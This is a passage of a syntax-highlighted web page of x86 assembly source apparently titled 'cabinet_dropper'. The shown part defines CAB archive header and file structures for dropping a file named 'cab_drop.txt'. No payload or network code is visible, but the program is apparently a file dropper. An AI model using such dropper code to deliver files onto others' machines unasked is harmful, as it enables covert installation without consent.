</span><span class="sc5">CABh_Reserved2</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;reserved</span><span class="sc0">
</span><span class="sc5">CABh_FirstRec</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;offset of the 1st entry</span><span class="sc0">
</span><span class="sc5">CABh_Reserved3</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;reserved</span><span class="sc0">
</span><span class="sc5">CABh_VersionMin</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;CAB file format version</span><span class="sc0">
</span><span class="sc5">CABh_VersionMaj</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">;curently: 0x0103</span><span class="sc0">
</span><span class="sc5">CABh_nFolders</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">;number of folders</span><span class="sc0">
</span><span class="sc5">CABh_nFiles</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">;number of files</span><span class="sc0">
</span><span class="sc5">CABh_Flags</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">;1=exist its prev. cabinet</span><span class="sc0">
                        </span><span class="sc1">;2=exist its next  cabinet</span><span class="sc0">
                        </span><span class="sc1">;4=exist its reser. field</span><span class="sc0">
</span><span class="sc5">CABh_ID</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">;identification number</span><span class="sc0">
</span><span class="sc5">CABh_Number</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">;number of cab (0=the first)</span><span class="sc0">

    </span><span class="sc5">CAB_reserved</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">CABr_length</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">;if CABh_Flags=4</span><span class="sc0">
</span><span class="sc5">CABr_reserved</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc5">CAB_directory_start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">CABd_FirstRec</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;offset of the 1st dir</span><span class="sc0">
</span><span class="sc5">CABd_nData</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">;number of cfDATA structz</span><span class="sc0">
</span><span class="sc5">CABd_Compress</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">;compression type</span><span class="sc0">
</span><span class="sc5">CABd_Reserved</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">       </span><span class="sc1">;this can be reserved area</span><span class="sc0">

    </span><span class="sc5">CAB_file_start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">CABf_UnCompSize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">Error_Message</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> \   </span><span class="sc1">;file size (uncompressed)</span><span class="sc0">
            </span><span class="sc5">Title_Message</span><span class="sc0">
</span><span class="sc5">CABf_FileStart</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;offset of the file</span><span class="sc0">
</span><span class="sc5">CABf_Flags</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">;0000=file in folder #0</span><span class="sc0">
                        </span><span class="sc1">;0001=file in folder #1</span><span class="sc0">
                        </span><span class="sc1">;FFFD=file from prev</span><span class="sc0">
                        </span><span class="sc1">;FFFE=file to next</span><span class="sc0">
                        </span><span class="sc1">;FFFF=file prev_and_next</span><span class="sc0">
</span><span class="sc5">CABf_Date</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">2729h</span><span class="sc0">           </span><span class="sc1">;date (9.9.1999 - wow!)</span><span class="sc0">
</span><span class="sc5">CABf_Time</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">4924h</span><span class="sc0">           </span><span class="sc1">;time (9:9:9)</span><span class="sc0">
</span><span class="sc5">CABf_Attribs</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0020h</span><span class="sc0">           </span><span class="sc1">;attr of the file</span><span class="sc0">
</span><span class="sc5">CABf_FileName</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'cab_drop.txt'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;file_name + 00h</span><span class="sc0">

    </span><span class="sc5">CAB_entry</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">CABe_CRC</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;checksum of this entry</span><span class="sc0">
</span><span class="sc5">CABe_Compr</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">Error_Message</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> \   </span><span class="sc1">;compressed size</span><span class="sc0">
            </span><span class="sc5">Title_Message</span><span class="sc0">
</span><span class="sc5">CABe_UnCompr</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">Error_Message</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> \   </span><span class="sc1">;uncompressed size</span><span class="sc0">
            </span><span class="sc5">Title_Message</span><span class="sc0">
</span><span class="sc5">CABe_Compr_data</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ end of program ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">cabinet_dropper</span><span class="sc0">
</span></div></body>
</html>
